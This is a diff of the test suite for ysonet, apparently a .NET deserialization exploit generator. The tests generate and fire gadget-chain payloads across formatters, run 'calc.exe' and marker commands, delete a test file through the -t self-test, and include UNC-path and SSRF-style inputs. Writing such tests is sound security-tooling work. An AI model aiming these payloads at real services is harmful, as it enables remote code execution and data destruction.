+            // Acceptance: -t generation succeeds and the -t refusal is gone. A nonexistent
+            // path keeps this half from deleting anything real (the finalizer's Delete is
+            // swallowed).
+            foreach (string formatter in TempFilesFormatters)
+            {
+                RunResult r = GenerateTempFiles(formatter, false, true,
+                    TestArtifactPath("ysonet_tfc_accept_nonexistent.txt"));
+                AssertTrue(r.Success, formatter + " with -t is accepted: " + r.ErrorMessage);
+                AssertTrue((r.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) < 0,
+                    formatter + ": no -t refusal remains: " + r.ErrorMessage);
+                AssertTrue(!RawIsEmpty(r.Raw), formatter + ": -t still ships a payload");
+            }
+
+            // And it really deletes: point -t at a test-owned victim, force the finalizer the
+            // -t self-test armed, and the victim is gone. BinaryFormatter reaches the real
+            // TempFileCollection sink (the DataContract paths self-test only the inert shape).
+            string victim = WriteTestArtifact("ysonet_tfc_selftest_victim.txt", "deleted by -t");
             try
             {
-                foreach (string formatter in TempFilesFormatters)
-                {
-                    RunResult r = GenerateTempFiles(formatter, false, true, victim);
-                    AssertTrue(!r.Success, formatter + " with -t is refused");
-                    AssertTrue((r.ErrorMessage ?? "").Contains("-t"),
-                        "the refusal names -t: " + r.ErrorMessage);
-                    AssertTrue(r.Raw == null, "a refused run returns no payload");
-                }
-
-                // If a live instance had been created and dropped, this is where it would
-                // delete the file. It must not.
+                RunResult r = GenerateTempFiles("BinaryFormatter", false, true, victim);
+                AssertTrue(r.Success, "the -t run generates: " + r.ErrorMessage);
                 GC.Collect();
                 GC.WaitForPendingFinalizers();
                 GC.Collect();
-                AssertTrue(File.Exists(victim),
-                    "the refusal happened before anything could construct the target type");
-                AssertEqual("must survive -t", File.ReadAllText(victim), "the file is untouched");
+                AssertTrue(!File.Exists(victim),
+                    "-t self-tested here, so the TempFileCollection finalizer deleted the victim");
             }
             finally { SafeDelete(victim); }
+
+            // The destructive -t must still refuse a path --minify would rewrite BEFORE it
+            // deletes anything: the guard runs on a Test=false probe first. A value the XML
+            // minifier collapses, with -t and --minify together, must come back refused and
+            // must NOT have deleted the (corrupted) path.
+            string protectedVictim = WriteTestArtifact("ysonet_tfc_selftest_minify_victim.txt",
+                "must survive a refused minify+-t");
+            try
+            {
+                // A trailing space is rewritten by the XML minifier, so SoapFormatter refuses.
+                RunResult r = GenerateTempFiles("SoapFormatter", true, true, protectedVictim + " ");
+                AssertTrue(!r.Success, "Soap + --minify + -t on a rewritten path is refused");
+                GC.Collect();
+                GC.WaitForPendingFinalizers();
+                GC.Collect();
+                AssertTrue(File.Exists(protectedVictim),
+                    "the refusal happened on the probe, before -t could delete the rewritten path");
+            }
+            finally { SafeDelete(protectedVictim); }
         }
 
         // This gadget DELETES the path it carries, so it must never ship a REWRITTEN one. Two
@@ -7400,10 +9790,10 @@ namespace ysonet.Tests
             }
         }
 
-        // The root container is a plain gadget option, exactly like ObjectDataProvider's
-        // --xamlurl: it must NOT appear as a variant, must start unset (so the default
-        // payload is unchanged), and must reach the echoed command line as
-        // --rootcontainer N.
+        // The root container is a plain gadget option, exactly like
+        // TextFormattingRunProperties' --xamlurl: it must NOT appear as a variant, must start
+        // unset (so the default payload is unchanged), and must reach the echoed command line
+        // as --rootcontainer N.
         private static void EditorExposesTheXamlContainerOption()
         {
             foreach (string gadget in XamlContainerGadgets)
@@ -7502,18 +9892,28 @@ namespace ysonet.Tests
             }
 
             // A gadget whose variants declare nothing keeps every option visible, for every
-            // variant. ObjectDataProvider has four variants and one plain option.
+            // variant. TextFormattingRunProperties has no variants but two plain options, and
+            // --xamlurl is the one that used to live on ObjectDataProvider.
+            var tfrpEd = new ModuleEditor(null, null, true, null, null);
+            var tfrpFields = tfrpEd.BuildFieldsForTest("TextFormattingRunProperties");
+            EditableField tfrpXamlUrl = FindEditable(tfrpFields, "xamlurl");
+            AssertTrue(tfrpXamlUrl != null && !tfrpXamlUrl.Hidden,
+                "TextFormattingRunProperties still offers xamlurl");
+
+            // ObjectDataProvider keeps its variants and its one plain option, and every
+            // variant leaves that option visible.
             var odpEd = new ModuleEditor(null, null, true, null, null);
             var odpFields = odpEd.BuildFieldsForTest("ObjectDataProvider");
-            EditableField xamlurl = FindEditable(odpFields, "xamlurl");
             EditableField odpVariant = FindEditable(odpFields, "variant");
-            AssertTrue(xamlurl != null && odpVariant != null, "ObjectDataProvider offers xamlurl and variant");
+            AssertTrue(odpVariant != null, "ObjectDataProvider offers variant");
+            AssertTrue(FindEditable(odpFields, "xamlurl") == null,
+                "ObjectDataProvider no longer offers xamlurl; it moved to ResourceDictionary as -c");
             foreach (GadgetVariant v in Gadget("ObjectDataProvider").Variants())
             {
                 odpVariant.Value = v.Label;
                 odpEd.RefreshDynamicForTest();
-                AssertTrue(!xamlurl.Hidden,
-                    "ObjectDataProvider variant " + v.Number + " declares no unused option, so xamlurl stays visible");
+                AssertTrue(!odpVariant.Hidden,
+                    "ObjectDataProvider variant " + v.Number + " declares no unused option");
             }
         }
 
@@ -10735,6 +13135,9 @@ namespace ysonet.Tests
                 case CommandInputType.TargetPathPair: return SampleTargetPathPair;
                 case CommandInputType.TargetPathAndLocalFile:
                     return SampleTargetPath + ";" + contentFixture;
+                // An address is pure target data: nothing here reads or writes it, and it
+                // is small enough to survive a 32-bit reader on the self-test path.
+                case CommandInputType.MemoryAddress: return "0x41414141";
                 default: return "calc.exe";
             }
         }
@@ -11618,6 +14021,10 @@ namespace ysonet.Tests
                 // (TextFormattingRunProperties) + SoapFormatter still generates.
                 { "DataTable|SoapFormatter|variant2",
                     "is not supported by variant 2" },
+                // DataTableTypeSpoof carries the same two inner gadgets as DataTable, so it
+                // inherits the same impossible cell: variant 2 is TypeConfuseDelegate.
+                { "DataTableTypeSpoof|SoapFormatter|variant2",
+                    "is not supported by variant 2" },
                 // The XML minifier is not text preserving (XmlXSLTMinifier trims text nodes,
                 // the XmlDocument round trip drops a CR). The two strings this gadget carries
                 // are user data the target uses literally, so the gadget verifies them after
@@ -11628,6 +14035,17 @@ namespace ysonet.Tests
                 // limitation belongs to the XML minifier, not to the gadget.
                 { "TypeConfuseDelegateFileOperations|NetDataContractSerializer|variant1|minify",
                     "cannot use --minify with NetDataContractSerializer" },
+                // WindowsClaimsIdentity variant 4 is the WIF type's OWN _actor member, whose
+                // document has to carry an m_userToken of type System.IntPtr. BinaryFormatter
+                // and LosFormatter carry it natively and the NetDataContractSerializer form
+                // expresses it with a nested value element; the three self-describing documents
+                // this gadget hand-writes have no shape for it. Variants 1-3 (the mscorlib
+                // ClaimsIdentity keys) are single string members and generate on all six, so
+                // only variant 4 is listed - which is the point: the limitation belongs to this
+                // one payload shape, not to the gadget.
+                { "WindowsClaimsIdentity|Json.NET|variant4", "is not supported by variant 4" },
+                { "WindowsClaimsIdentity|DataContractSerializer|variant4", "is not supported by variant 4" },
+                { "WindowsClaimsIdentity|SoapFormatter|variant4", "is not supported by variant 4" },
             };
 
             // Cells whose MINIFIED output is XML but intentionally NOT standalone well-formed,
@@ -11696,22 +14114,35 @@ namespace ysonet.Tests
                                 ia.Cmd = SampleInputForGadget(inType, csFixture, dllFixture, contentFixture);
                                 ia.Minify = minify;
                                 ia.Test = false;
-                                // Pass the variant plus a xamlurl: the 3rd (SSRF) variant of
-                                // ObjectDataProvider needs a xamlurl, not a shell command; gadgets
-                                // without that option ignore the extra argument. Only ObjectDataProvider
-                                // itself needs it now - WindowsClaimsIdentity used to as well, because
-                                // its own --variant 3 leaked into the inner ObjectDataProvider; that
-                                // leak is fixed by GenerateInner, and
-                                // EveryVariantGeneratesFromTheVariantFlagAlone holds the line.
+                                // Only the variant. A blanket "--xamlurl http://127.0.0.1/x"
+                                // used to go to every module here, because ObjectDataProvider
+                                // variant 3 took its input that way instead of through -c.
+                                // That variant is now the ResourceDictionary gadget with a
+                                // normal -c, and the blanket argument was also silently
+                                // switching TextFormattingRunProperties onto its URL form for
+                                // every cell, so its command path was never generated here.
                                 var extra = new List<string>();
                                 if (variant != null) { extra.Add(variantFlag); extra.Add(variant.Number.ToString()); }
-                                extra.Add("--xamlurl"); extra.Add("http://127.0.0.1/x");
                                 // DataSetXxe variant 2 writes a companion DTD and refuses to
                                 // overwrite one, so every cell needs its OWN destination -
                                 // sharing a path would correctly fail the second cell and that
                                 // failure must not be hidden in the expected-failure table.
                                 // Named per gadget, because --file is too generic to hand to
-                                // every module the way --xamlurl is.
+                                // every module.
+                                // ResXFileRef variant 3 names the activated type through
+                                // --type and has no default for it (the operator's type
+                                // decides the whole effect), so the matrix has to supply one
+                                // or the cell would only ever test the refusal. An mscorlib
+                                // type with a public Stream constructor, named the same way
+                                // an operator would.
+                                if (string.Equals(name, "ResXFileRef", StringComparison.Ordinal)
+                                    && variant != null
+                                    && variant.Number == ResXFileRefGenerator.VariantActivateNamedType)
+                                {
+                                    extra.Add("--" + ResXFileRefGenerator.TypeOptionName);
+                                    extra.Add("System.IO.BufferedStream, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
+                                }
+
                                 string dtdOut = null;
                                 if (string.Equals(name, "DataSetXxe", StringComparison.Ordinal)
                                     && variant != null
@@ -11793,12 +14224,12 @@ namespace ysonet.Tests
             }
 
             AssertTrue(cells > 100, "matrix exercised many cells (was " + cells + ")");
-            // Three variant-scoped SoapFormatter-generics keys, each matching both minify
-            // states = six required expected-failure cells (two of them the new DataTable
-            // variant-2 pair), plus the minify-only file-operations text-preservation cell.
-            // This floor forces those cells to actually be reached and guarded, not merely
-            // sit unused in the dictionary.
-            AssertTrue(expectedFailures >= 7,
+            // Four variant-scoped SoapFormatter-generics keys, each matching both minify
+            // states = eight required expected-failure cells (two of them the DataTable
+            // variant-2 pair and two the DataTableTypeSpoof pair), plus the minify-only
+            // file-operations text-preservation cell. This floor forces those cells to
+            // actually be reached and guarded, not merely sit unused in the dictionary.
+            AssertTrue(expectedFailures >= 9,
                 "the known SoapFormatter-generics limitation cells were exercised (was " + expectedFailures + ")");
             AssertTrue(failures.Count == 0,
                 "gadget matrix cells failed (" + failures.Count + " of " + cells + "; " + expectedFailures + " expected-failures verified):\n  "
@@ -11991,9 +14422,7 @@ namespace ysonet.Tests
                 if (string.IsNullOrEmpty(bridgedFmt)) continue; // skip any bridge that declares no formatter (none currently)
 
                 consumers++;
-                // The leaf must produce the consumer's expected bridged formatter.
-                string leaf = bridgedFmt.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)
-                    ? "TextFormattingRunProperties" : "TypeConfuseDelegate";
+                string leaf = BridgeLeafFor(bridgedFmt);
                 string finalFmt = g.SupportedFormatters()[0].Split(' ')[0];
 
                 GenerationRequest req = new GenerationRequest
@@ -12103,8 +14532,7 @@ namespace ysonet.Tests
                 if (string.IsNullOrEmpty(bridgedFmt)) continue; // skip any bridge that declares no formatter (none currently)
 
                 consumers++;
-                string leaf = bridgedFmt.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)
-                    ? "TextFormattingRunProperties" : "TypeConfuseDelegate";
+                string leaf = BridgeLeafFor(bridgedFmt);
                 string finalFmt = g.SupportedFormatters()[0].Split(' ')[0];
 
                 RunResult raw = BridgeGen(name, leaf, finalFmt, false);
@@ -12128,6 +14556,27 @@ namespace ysonet.Tests
             // Fire the representative chain BOTH ways: minify must not break bridged execution.
             FireBridgedChain(false);
             FireBridgedChain(true);
+        }
+
+        // A leaf gadget that really produces the consumer's declared bridged formatter. Every
+        // consumer takes BinaryFormatter, LosFormatter, Xaml or NetDataContractSerializer today;
+        // an unknown one is a hard error rather than a silent fall-through to
+        // TypeConfuseDelegate, which supports neither Los nor Xaml and would report a product
+        // failure for a gap in this table.
+        private static string BridgeLeafFor(string bridgedFormatter)
+        {
+            if (bridgedFormatter.Equals(Formatters.LosFormatter, StringComparison.OrdinalIgnoreCase))
+                return "TextFormattingRunProperties";
+            if (bridgedFormatter.Equals(Formatters.Xaml, StringComparison.OrdinalIgnoreCase))
+                return "ObjectDataProvider";
+            if (bridgedFormatter.Equals(Formatters.BinaryFormatter, StringComparison.OrdinalIgnoreCase))
+                return "TypeConfuseDelegate";
+            // DynamicUpdateMapExtension is the first consumer to take an NDCS document, and
+            // TypeConfuseDelegate is exactly the chain that bridge exists to deliver.
+            if (bridgedFormatter.Equals(Formatters.NetDataContractSerializer, StringComparison.OrdinalIgnoreCase))
+                return "TypeConfuseDelegate";
+            throw new Exception("no bridge leaf is known for the bridged formatter '"
+                + bridgedFormatter + "'; add one here when a consumer declares it");
         }
 
         private static RunResult BridgeGen(string consumer, string leaf, string finalFmt, bool minify)
@@ -12337,6 +14786,10 @@ namespace ysonet.Tests
                 new PluginCell("Resx", new[] { "-M", "BinaryFormatter", "-c", "calc.exe" }).Shrinks(),
                 new PluginCell("Resx", new[] { "-M", "SoapFormatter", "-c", csFixture }),
                 new PluginCell("Resx", new[] { "-M", "indirect_resx_file", "-F", "\\\\host\\share\\a.resx" }),
+                // The same carrier with the converted type and the encoding chosen: the two
+                // options are indirect_resx_file's only new surface, so each gets a cell.
+                new PluginCell("Resx", new[] { "-M", "indirect_resx_file", "-F", "\\\\host\\share\\a.txt", "--type", "System.String", "--enc", "utf-8" }),
+                new PluginCell("Resx", new[] { "-M", "indirect_resx_file", "-F", "\\\\host\\share\\a.bin", "--type", "System.IO.BufferedStream, mscorlib" }),
                 new PluginCell("Resx", new[] { "-M", "CompiledDotResources", "-c", "calc.exe", "-of", resxOut }),
 
                 new PluginCell("SessionSecurityTokenHandler", new[] { "-c", "calc.exe" }),
@@ -12595,6 +15048,11 @@ namespace ysonet.Tests
                 case "xaml": SerializersHelper.Xaml_deserialize(Text(raw)); break;
                 case "json": SerializersHelper.JsonNet_deserialize(Text(raw)); break;
                 case "ndc": SerializersHelper.NetDataContractSerializer_deserialize(Text(raw)); break;
+                // Two gadgets (WindowsIdentity, WindowsClaimsIdentity) wrap their NDCS document
+                // in a <root> envelope, the way the DCS payloads do, so the serializer has to be
+                // pointed at the child element. The plain "ndc" tag hands <root> straight to
+                // NetDataContractSerializer, which rejects it before the payload is reached.
+                case "ndcroot": SerializersHelper.NetDataContractSerializer_deserialize(Text(raw), "root"); break;
                 case "dcs": SerializersHelper.DataContractSerializer_deserialize(Text(raw), null, "root", "type"); break;
                 case "soap": SerializersHelper.SoapFormatter_deserialize(Text(raw)); break;
                 case "jss": SerializersHelper.JavaScriptSerializer_deserialize(Text(raw)); break;
@@ -12948,6 +15406,399 @@ namespace ysonet.Tests
             finally { if (fire != null) fire.Dispose(); SafeDelete(resxOut); }
         }
 
+        // Fire WorkflowDesigner through the product's own -t in a CHILD ysonet process, one
+        // child per cell.
+        //
+        // WHY A CHILD, when almost every other fire row deserializes in-process. The target's
+        // constructor creates a System.Windows.Application when the process has none, and that
+        // object is a per-AppDomain singleton owned by the thread that made it. In-process the
+        // first cell would leave a live WPF Application inside the test runner for every later
+        // test to inherit, and the second cell - on the next RunSTA thread - would fail
+        // reaching Application.Current from the wrong thread. Neither is a property of the
+        // payload, so both would be the harness inventing a result. A child gets a clean
+        // process, which is also what a real target is.
+        //
+        // The product's -t is the right entry point here rather than a bare deserialize,
+        // because the STA thread the target needs is the gadget's own declaration
+        // (SelfTestNeedsStaThread), and firing through -t is what proves that wiring works.
+        //
+        // --rawcmd for the usual reason (see FirePluginMarker): the payload starts the
+        // windowless sink itself instead of a cmd.exe whose console Windows 11 hosts outside
+        // the hidden desktop.
+        private static void FireWorkflowDesignerSubprocess(string formatter, bool minify,
+            FailureCollector failures, ref int fired, ref int skipped, bool trace)
+        {
+            if (RefuseToFireDosGadget(WdGadget, failures)) return;
+            string label = WdGadget + " " + formatter + (minify ? " (minified)" : "");
+            string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
+            if (!File.Exists(exe))
+            {
+                skipped++;
+                Console.Error.WriteLine("  [skip] fire " + label + ": ysonet.exe not found beside the test exe");
+                return;
+            }
+            if (trace) { Console.Error.WriteLine("    [fire] " + label + " (subprocess)"); Console.Error.Flush(); }
+
+            FireTarget fire = null;
+            try
+            {
+                fire = FireBackend.Create("workflowdesigner");
+                string quotedCmd = "\"" + fire.Command.Replace("\"", "\\\"") + "\"";
+                string args = "-g " + WdGadget + " -f \"" + formatter + "\" -c " + quotedCmd
+                    + " --rawcmd -t" + (minify ? " --minify" : "");
+                var psi = new System.Diagnostics.ProcessStartInfo(exe, args);
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                psi.RedirectStandardOutput = true;
+                psi.RedirectStandardError = true;
+                using (var proc = System.Diagnostics.Process.Start(psi))
+                {
+                    // Drain both pipes asynchronously: a payload on stdout is large, and a
+                    // blocking read on a child that fail-fasts never sees end of stream.
+                    proc.OutputDataReceived += delegate { };
+                    proc.ErrorDataReceived += delegate { };
+                    proc.BeginOutputReadLine();
+                    proc.BeginErrorReadLine();
+                    if (!proc.WaitForExit(60000)) { try { proc.Kill(); } catch { } }
+                }
+                if (fire.Wait(MarkerWaitMs)) { fired++; RuntimeBuild.RecordFired(WdGadget); }
+                else failures.Add("fire " + label + " (subprocess): the sink was never reached");
+            }
+            catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
+            finally { if (fire != null) fire.Dispose(); }
+        }
+
+        // `-t` is a shipped feature - "deserialize the payload here so I can see the effect" -
+        // and until now NOTHING asserted that it produces the effect. Every other fire test
+        // generates with Test=false and deserializes through the harness's own helper, which
+        // proves the PAYLOAD works and says nothing about the product's self-test path (a
+        // different deserializer call, on a different thread, with its exception swallowed).
+        //
+        // That gap is what made a day of shell probing inconclusive: `ysonet.exe ... -t` with a
+        // marker command gave non-reproducible results, and there was no controlled measurement
+        // to compare against. This is it. Same gadget, every advertised formatter, generation
+        // with Test=true, and the marker as the proof.
+        private static void SelfTestFiresThroughTheProductsOwnPath()
+        {
+            string[] formatters = { "BinaryFormatter", "Json.NET", "DataContractSerializer",
+                "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
+            var missed = new List<string>();
+
+            foreach (string formatter in formatters)
+            {
+                FireTarget fire = null;
+                try
+                {
+                    fire = FireBackend.Create("selftest_" + formatter);
+                    InputArgs ia = new InputArgs();
+                    ia.Cmd = fire.Command;
+                    ia.IsRawCmd = true;
+                    ia.Test = true;   // the whole point: drive the product's own -t path
+                    RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+                    {
+                        GadgetName = "WindowsIdentity",
+                        FormatterName = formatter,
+                        OutputFormat = "",
+                        InputArgs = ia,
+                    });
+                    AssertTrue(r.Success, "WindowsIdentity -t generates on " + formatter
+                        + " (" + r.ErrorMessage + ")");
+                    if (!fire.Wait(MarkerWaitMs)) missed.Add(formatter);
+                }
+                finally { if (fire != null) fire.Dispose(); }
+            }
+
+            AssertEqual(0, missed.Count,
+                "-t reaches the sink on every advertised formatter; missed: "
+                    + string.Join(", ", missed.ToArray()));
+        }
+
+        // ShowErrors is the only window into why a gadget's -t self-test did not do what it
+        // was meant to. It used to print err.StackTrace alone - no type, no message, no inner
+        // exception - which made "died inside the deserializer" and "reached the sink and
+        // fired" produce identical output, and hid every formatter-shape failure (those name
+        // their cause in the INNER exception). It must also stay OFF stdout, because stdout
+        // carries the payload and a caller redirecting it would otherwise get a corrupt file.
+        private static void ShowErrorsExplainsTheWholeExceptionChain()
+        {
+            Exception thrown;
+            try
+            {
+                try { throw new FormatException("inner cause nobody could see before"); }
+                catch (Exception inner) { throw new InvalidOperationException("outer wrapper", inner); }
+            }
+            catch (Exception e) { thrown = e; }
+
+            var so = new StringWriter();
+            var se = new StringWriter();
+            TextWriter prevOut = Console.Out, prevErr = Console.Error;
+            Console.SetOut(so);
+            Console.SetError(se);
+            try
+            {
+                InputArgs quiet = new InputArgs();
+                quiet.IsDebugMode = false;
+                Debugging.ShowErrors(quiet, thrown);
+
+                InputArgs debug = new InputArgs();
+                debug.IsDebugMode = true;
+                Debugging.ShowErrors(debug, thrown);
+                Debugging.ShowErrors(debug, null);
+                Debugging.ShowErrors(null, thrown);
+            }
+            finally { Console.SetOut(prevOut); Console.SetError(prevErr); }
+
+            string err = se.ToString();
+            AssertTrue(so.ToString().Length == 0, "ShowErrors writes nothing to stdout, which carries the payload");
+            AssertTrue(err.Contains("System.InvalidOperationException"), "the outer exception type is named");
+            AssertTrue(err.Contains("outer wrapper"), "the outer message is printed");
+            AssertTrue(err.Contains("System.FormatException"), "the inner exception type is named");
+            AssertTrue(err.Contains("inner cause nobody could see before"), "the inner message is printed");
+
+            // A quiet run, a null exception and null args must all be silent rather than
+            // throwing from inside a catch block, which is where every call site lives.
+            int occurrences = 0, at = 0;
+            while ((at = err.IndexOf("outer wrapper", at, StringComparison.Ordinal)) >= 0) { occurrences++; at++; }
+            AssertEqual(1, occurrences, "only the debug-mode call printed (a quiet run stays silent)");
+        }
+
+        // The three SerializationInfo names ClaimsIdentity.Deserialize re-runs an unbindered
+        // BinaryFormatter on. Everything else it accepts is a plain info.GetString.
+        private const string ActorKey = "System.Security.ClaimsIdentity.actor";
+        private const string BootstrapKey = "System.Security.ClaimsIdentity.bootstrapContext";
+        private const string ClaimsKey = "System.Security.ClaimsIdentity.claims";
+
+        // Which member each gadget/variant pair is supposed to write. BOTH gadgets are uniform:
+        // a variant number means the same member on every formatter that supports it, and 1/2/3
+        // mean the same thing on both gadgets so the two carriers of this sink are learnable
+        // together.
+        //
+        // WindowsClaimsIdentity has one extra: variant 4 is the WIF type's OWN "_actor" member,
+        // a separate sink inside Microsoft.IdentityModel rather than mscorlib's
+        // ClaimsIdentity.Deserialize. That form has to carry an IntPtr m_userToken, which only
+        // the two binary formatters and the NDCS document shape can express, so the variant
+        // declares Without(...) for the other three - see ClaimsKeyWifVariantRefusesFormatters.
+        //
+        // Before this was unified a number meant different members on different formatters
+        // (variant 1 was the WIF form on BF/Los/NDCS and .actor elsewhere, and variant 3 fell
+        // through to variant 1 on three of the six). Every combination fired, so only an
+        // assertion like this one can catch it.
+        private const string WifActorMember = "_actor";
+
+        private static string ExpectedClaimsKey(string gadget, string formatter, int variant)
+        {
+            if (variant == 2) return BootstrapKey;
+            if (variant == 3) return ClaimsKey;
+            if (variant == 4 && gadget == "WindowsClaimsIdentity") return WifActorMember;
+            return ActorKey;
+        }
+
+        // The formatters WindowsClaimsIdentity variant 4 opts out of.
+        private static bool ClaimsVariantIsSupported(string gadget, string formatter, int variant)
+        {
+            if (gadget != "WindowsClaimsIdentity" || variant != 4) return true;
+            return formatter == "BinaryFormatter" || formatter == "LosFormatter"
+                || formatter == "NetDataContractSerializer";
+        }
+
+        // A payload as searchable text. LosFormatter output is base64 (see the two encodings
+        // note in the testing memory), so it has to be decoded before any member name is
+        // visible; every other formatter here writes the name literally. Latin1 keeps the
+        // BinaryFormatter byte stream searchable without a decoder throwing on a non-UTF8 byte.
+        private static string SearchableText(string formatter, object raw)
+        {
+            byte[] bytes = Bytes(raw);
+            if (formatter == "LosFormatter")
+            {
+                try { bytes = Convert.FromBase64String(Encoding.ASCII.GetString(bytes).Trim()); }
+                catch (FormatException) { /* not base64 after all: search it as written */ }
+            }
+            return Encoding.GetEncoding(28591).GetString(bytes);
+        }
+
+        // The inner BinaryFormatter payload these carriers hold is a base64 STRING member, so
+        // nothing about the inner graph is visible in the outer bytes. Take the longest base64
+        // run in the document (there is only one that size: the payload itself) and decode it.
+        private static string DecodedInnerBlob(string payloadText)
+        {
+            string longest = "";
+            foreach (System.Text.RegularExpressions.Match m in
+                System.Text.RegularExpressions.Regex.Matches(payloadText, "[A-Za-z0-9+/]{200,}={0,2}"))
+                if (m.Value.Length > longest.Length) longest = m.Value;
+            if (longest.Length == 0) return "";
+            // A run picked out of a byte stream may not sit on a 4-character boundary.
+            longest = longest.Substring(0, longest.Length - longest.Length % 4);
+            try { return Encoding.GetEncoding(28591).GetString(Convert.FromBase64String(longest)); }
+            catch (FormatException) { return ""; }
+        }
+
+        private static RunResult GenerateClaimsKeyPayload(string gadget, string formatter,
+            int variant, bool minify, string bridgedChain)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe";
+            ia.IsRawCmd = true;
+            ia.Test = false;
+            ia.Minify = minify;
+            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = gadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+                BridgedGadgetChain = bridgedChain,
+            });
+        }
+
+        // Every variant of the two ISerializable claims carriers writes ITS OWN key and none of
+        // the others, on every advertised formatter, raw and minified. This is the assertion
+        // that makes the variant selector meaningful: all three keys reach the same sink, so a
+        // payload that quietly wrote the default one would still fire and still look correct.
+        private static void ClaimsKeyVariantsCarryOnlyTheirOwnKey()
+        {
+            string[] formatters = { "BinaryFormatter", "Json.NET", "DataContractSerializer",
+                "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
+            string[] allKeys = { ActorKey, BootstrapKey, ClaimsKey };
+
+            foreach (string gadget in new[] { "WindowsIdentity", "WindowsClaimsIdentity" })
+            {
+                int lastVariant = gadget == "WindowsIdentity" ? 3 : 4;
+                foreach (string formatter in formatters)
+                    for (int v = 1; v <= lastVariant; v++)
+                        foreach (bool minify in new[] { false, true })
+                        {
+                            string cell = gadget + "/" + formatter + "/v" + v + (minify ? "/minified" : "");
+                            if (!ClaimsVariantIsSupported(gadget, formatter, v)) continue;
+
+                            RunResult r = GenerateClaimsKeyPayload(gadget, formatter, v, minify, null);
+                            AssertTrue(r.Success, cell + " generates (" + r.ErrorMessage + ")");
+                            string text = SearchableText(formatter, r.Raw);
+
+                            string expected = ExpectedClaimsKey(gadget, formatter, v);
+                            AssertTrue(text.Contains(expected), cell + " carries " + expected);
+                            foreach (string other in allKeys)
+                                if (other != expected)
+                                    AssertTrue(!text.Contains(other), cell + " does not also carry " + other);
+                        }
+            }
+        }
+
+        // WindowsClaimsIdentity variant 4 is the WIF `_actor` form, whose document has to carry
+        // an IntPtr m_userToken. The two binary formatters carry it natively and the NDCS
+        // document expresses it with a nested value element; the three self-describing
+        // documents this gadget hand-writes have no shape for it. The variant declares that
+        // with Without(...), so the pair is REFUSED BY NAME rather than falling through to
+        // another member - which is what the old numbering did, and what made the divergence
+        // invisible.
+        private static void ClaimsKeyWifVariantRefusesFormatters()
+        {
+            foreach (string formatter in new[] { "Json.NET", "DataContractSerializer", "SoapFormatter" })
+            {
+                RunResult r = GenerateClaimsKeyPayload("WindowsClaimsIdentity", formatter, 4, false, null);
+                AssertTrue(!r.Success, formatter + " is refused for WindowsClaimsIdentity variant 4");
+                AssertTrue(r.ErrorMessage != null && r.ErrorMessage.Contains("variant 4"),
+                    formatter + "'s refusal names the variant (got: " + r.ErrorMessage + ")");
+            }
+
+            foreach (string formatter in new[] { "BinaryFormatter", "LosFormatter", "NetDataContractSerializer" })
+            {
+                RunResult r = GenerateClaimsKeyPayload("WindowsClaimsIdentity", formatter, 4, false, null);
+                AssertTrue(r.Success, formatter + " builds WindowsClaimsIdentity variant 4 (" + r.ErrorMessage + ")");
+                string text = SearchableText(formatter, r.Raw);
+                // The four companions the WIF constructor reads. Without them it throws before
+                // it reaches _actor, so their presence is what makes this variant work at all.
+                foreach (string member in new[] { "_actor", "m_userToken", "_label", "_nameClaimType", "_roleClaimType" })
+                    AssertTrue(text.Contains(member), formatter + " variant 4 carries " + member);
+            }
+        }
+
+        // An unknown variant number falls through to variant 1 rather than throwing, matching
+        // the rest of the catalogue, and it produces variant 1's bytes exactly - not merely a
+        // payload that happens to carry the same key.
+        private static void ClaimsKeyOutOfRangeVariantFallsBackToOne()
+        {
+            string[] formatters = { "BinaryFormatter", "Json.NET", "DataContractSerializer",
+                "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
+            foreach (string gadget in new[] { "WindowsIdentity", "WindowsClaimsIdentity" })
+                foreach (string formatter in formatters)
+                {
+                    RunResult one = GenerateClaimsKeyPayload(gadget, formatter, 1, false, null);
+                    RunResult unknown = GenerateClaimsKeyPayload(gadget, formatter, 99, false, null);
+                    AssertTrue(one.Success && unknown.Success,
+                        gadget + "/" + formatter + " generates for variant 1 and for an unknown variant");
+                    AssertTrue(BytesEqual(Bytes(one.Raw), Bytes(unknown.Raw)),
+                        gadget + "/" + formatter + " --variant 99 produces variant 1's bytes");
+                }
+        }
+
+        // A bridged inner payload must still land under the variant's key. The bridge replaces
+        // WHAT is carried, never WHERE it is carried.
+        //
+        // The leaf is AxHostState because it declares NO --variant option. That matters: a
+        // --bgc chain forwards ONE option set to every gadget in it (unlike the default inner,
+        // which goes through GenerateInner and sees no ExtraArguments at all), so a leaf that
+        // parses --variant would be handed the outer gadget's number. The second half of this
+        // test pins that behaviour down instead of leaving it to be rediscovered.
+        private static void ClaimsKeyVariantsHonourABridgedPayload()
+        {
+            foreach (string gadget in new[] { "WindowsIdentity", "WindowsClaimsIdentity" })
+            {
+                int lastVariant = gadget == "WindowsIdentity" ? 3 : 4;
+                for (int v = 1; v <= lastVariant; v++)
+                {
+                    RunResult r = GenerateClaimsKeyPayload(gadget, "BinaryFormatter", v, false,
+                        "AxHostState");
+                    string cell = gadget + "/BinaryFormatter/v" + v + " bridged";
+                    AssertTrue(r.Success, cell + " generates (" + r.ErrorMessage + ")");
+                    string text = SearchableText("BinaryFormatter", r.Raw);
+                    AssertTrue(text.Contains(ExpectedClaimsKey(gadget, "BinaryFormatter", v)),
+                        cell + " still carries " + ExpectedClaimsKey(gadget, "BinaryFormatter", v));
+                    // The inner blob travels as the base64 string the key names, so the bridged
+                    // graph is only visible after decoding it.
+                    AssertTrue(DecodedInnerBlob(text).Contains("AxHost"),
+                        cell + " carries the bridged AxHostState graph, not the default inner");
+                }
+            }
+
